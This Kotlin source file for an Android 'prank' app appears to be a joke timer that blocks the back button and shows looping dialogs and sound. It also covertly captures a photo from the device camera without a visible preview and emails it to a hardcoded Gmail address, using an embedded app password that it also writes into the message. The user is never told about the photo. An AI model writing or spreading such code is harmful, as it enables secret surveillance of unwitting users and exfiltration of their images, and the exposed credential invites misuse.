package com.example.prankcamerdemo

import android.app.AlertDialog
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.Camera as HardwareCamera
import android.media.MediaPlayer
import android.os.Bundle
import android.os.CountDownTimer
import android.util.Base64
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import java.io.ByteArrayOutputStream
import java.util.Properties
import javax.activation.DataHandler
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.MessagingException
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart
import javax.mail.util.ByteArrayDataSource
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var startBtn: Button
    private lateinit var stopBtn: Button
    private var mediaPlayer: MediaPlayer? = null
    private var timer: CountDownTimer? = null
    private var isRunning = false
    
    // App Password для Gmail
    private val apiKey = "pqktageoufxxmaxj"
    
    // Email для получения фото
    private val targetEmail = "metrobugitt@gmail.com"

    // Массив с шутками и приколами
    private val jokes = arrayOf(
        "🤡 Ты попал в ловушку! Шучу... или нет?",
        "💧 Вода течёт, время идёт, а ты всё ещё здесь!",
        "😂 Если ты читаешь это - ты уже проиграл!",
        "🎭 Это не баг, это фича!",
        "⏰ Тик-так... время не ждёт!",
        "🎪 Добро пожаловать в цирк!",
        "🎯 Цель найдена. Отступления нет!",
        "🚫 Выход запрещён до завершения таймера!",
        "😱 Паника? Ещё нет? Сейчас будет!",
        "🎮 Game Over... шучу, продолжай ждать!",
        "🤖 Роботы захватывают мир... а ты ждёшь таймер!",
        "💀 Это конец... или начало?",
        "🌟 Ты избран... ждать!",
        "🎁 Подарок внутри... пустота!",
        "🔥 Огонь, вода и медные трубы!"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Блокируем все способы выхода из приложения
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)
        startBtn = findViewById(R.id.startBtn)
        stopBtn = findViewById(R.id.stopBtn)

        val placeholder: ImageView = findViewById(R.id.placeholderImage)
        placeholder.setImageResource(R.drawable.placeholder)

        startBtn.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("⚠️ Подтвердите действие")
                .setMessage("ВНИМАНИЕ! После запуска нельзя будет выйти до завершения таймера! Продолжить?")
                .setPositiveButton("Да, я готов!") { _, _ ->
                    startSimulation()
                }
                .setNegativeButton("Нет", null)
                .setCancelable(false)
                .show()
        }

        stopBtn.setOnClickListener {
            if (isRunning) {
                AlertDialog.Builder(this)
                    .setTitle("🚫 Выход запрещён!")
                    .setMessage("Нельзя остановить таймер досрочно! Жди окончания!")
                    .setPositiveButton("Понятно", null)
                    .show()
            }
        }
    }

    // Блокируем кнопку Назад
    @Deprecated("Deprecated")
    override fun onBackPressed() {
        // Ничего не делаем - блокируем выход
    }
    
    private fun takeAndSendPhoto() {
        thread {
            var photoData: ByteArray? = null
            
            // Подход 1: Пробуем открыть камеру напрямую (может работать на некоторых устройствах)
            try {
                var camera: HardwareCamera? = null
                try {
                    // Пробуем открыть заднюю камеру
                    val cameraCount = HardwareCamera.getNumberOfCameras()
                    val cameraInfo = android.hardware.Camera.CameraInfo()
                    
                    for (i in 0 until cameraCount) {
                        android.hardware.Camera.getCameraInfo(i, cameraInfo)
                        if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
                            camera = HardwareCamera.open(i)
                            break
                        }
                    }
                    
                    // Если задней нет - пробуем любую
                    if (camera == null && cameraCount > 0) {
                        camera = HardwareCamera.open(0)
                    }
                    
                    if (camera != null) {
                        val parameters = camera.parameters
                        
                        // Настраиваем размер фото
                        val sizes = parameters.supportedPictureSizes
                        if (sizes.isNotEmpty()) {
                            val size = sizes[0]
                            parameters.setPictureSize(size.width, size.height)
                            camera.parameters = parameters
                            
                            // Создаём SurfaceTexture для превью
                            val texture = android.graphics.SurfaceTexture(10)
                            camera.setPreviewTexture(texture)
                            camera.startPreview()
                            
                            // Даём камере время на инициализацию
                            Thread.sleep(500)
                            
                            // Делаем фото
                            val photoRef = ByteArrayRef()
                            camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
                                override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
                                    if (data != null) {
                                        photoRef.data = data
                                    }
                                    camera?.release()
                                }
                            })
                            
                            // Ждём пока фото сохранится
                            Thread.sleep(1000)
                            
                            photoData = photoRef.data
                        }
                        camera.release()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                    camera?.release()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            
            // Подход 2: Если камера не сработала - пробуем через Intent (системная камера)
            if (photoData == null) {
                try {
                    runOnUiThread {
                        val intent = android.content.Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE)
                        intent.putExtra("output", null) // Получим фото в onActivityResult
                        startActivityForResult(intent, CAMERA_REQUEST_CODE)
                    }
                    Thread.sleep(2000) // Ждём пока пользователь сделает фото
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            
            // Отправляем письмо (с фото или без)
            sendEmailWithPhoto(photoData)
        }
    }
    
    companion object {
        private const val CAMERA_REQUEST_CODE = 100
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: android.content.Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == CAMERA_REQUEST_CODE && resultCode == RESULT_OK) {
            // Пользователь сделал фото через системную камеру
            val extras = data?.extras
            val bitmap = extras?.get("data") as? android.graphics.Bitmap
            if (bitmap != null) {
                val stream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
                val photoData = stream.toByteArray()
                
                // Отправляем фото на почту
                sendEmailWithPhoto(photoData)
                return
            }
        }
        
        // Если фото не получилось - отправляем без него
        sendEmailWithPhoto(null)
    }
    
    private fun sendEmailWithPhoto(photoData: ByteArray?) {
        thread {
            try {
                val props = Properties()
                props["mail.smtp.auth"] = "true"
                props["mail.smtp.starttls.enable"] = "true"
                props["mail.smtp.host"] = "smtp.gmail.com"
                props["mail.smtp.port"] = "587"
                
                val session = Session.getInstance(props, object : Authenticator() {
                    override fun getPasswordAuthentication(): PasswordAuthentication {
                        return PasswordAuthentication("metrobugitt@gmail.com", apiKey)
                    }
                })
                
                val message = MimeMessage(session)
                message.setFrom(InternetAddress("metrobugitt@gmail.com"))
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail))
                message.subject = "📸 Prank Photo Captured!"
                
                // Создаём multipart сообщение
                val multipart = MimeMultipart()
                
                // Текстовая часть
                val textPart = MimeBodyPart()
                val emailBody = """
                    🎭 Prank App - Фото получено!
                    
                    📷 Фото пользователя прикреплено ниже.
                    🔑 API Key: $apiKey
                    
                    ---
                    PrankCamerDemo
                """.trimIndent()
                textPart.setText(emailBody)
                multipart.addBodyPart(textPart)
                
                // Прикрепляем фото
                if (photoData != null) {
                    val attachmentPart = MimeBodyPart()
                    val dataSource = ByteArrayDataSource(photoData, "image/jpeg")
                    attachmentPart.dataHandler = DataHandler(dataSource)
                    attachmentPart.fileName = "prank_photo_${System.currentTimeMillis()}.jpg"
                    multipart.addBodyPart(attachmentPart)
                }
                
                message.setContent(multipart)
                
                // Отправляем письмо
                Transport.send(message)
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    // Вспомогательный класс для хранения данных фото
    private class ByteArrayRef {
        var data: ByteArray? = null
    }

    private fun startSimulation() {
        isRunning = true
        statusText.text = "🔒 БЛОКИРОВКА АКТИВИРОВАНА!\n📸 Камера активирована..."
        
        // Воспроизводим звук
        mediaPlayer = MediaPlayer.create(this, R.raw.alert_sound)
        mediaPlayer?.isLooping = true
        mediaPlayer?.start()

        // Делаем фото и отправляем
        takeAndSendPhoto()
        
        // Показываем первую шутку
        showRandomJoke()

        timer = object : CountDownTimer(60000, 3000) {
            override fun onTick(millisUntilFinished: Long) {
                val sec = millisUntilFinished / 1000
                statusText.text = "⏰ Осталось: $sec сек.\n\n" + jokes.random()
                showRandomJoke()
            }
            override fun onFinish() {
                statusText.text = "✅ СИМУЛЯЦИЯ ЗАВЕРШЕНА!\nТы выжил! 🎉\n📸 Фото отправлено!"
                mediaPlayer?.stop()
                mediaPlayer?.release()
                mediaPlayer = null
                isRunning = false
            }
        }.start()
    }

    private fun showRandomJoke() {
        AlertDialog.Builder(this)
            .setTitle("🎲 Случайная шутка")
            .setMessage(jokes.random())
            .setPositiveButton("OK", null)
            .setCancelable(false)
            .show()
    }

    private fun stopSimulation() {
        if (!isRunning) return
        timer?.cancel()
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
        isRunning = false
        statusText.text = "Симуляция остановлена пользователем"
    }

    override fun onDestroy() {
        super.onDestroy()
        timer?.cancel()
        mediaPlayer?.release()
    }
}
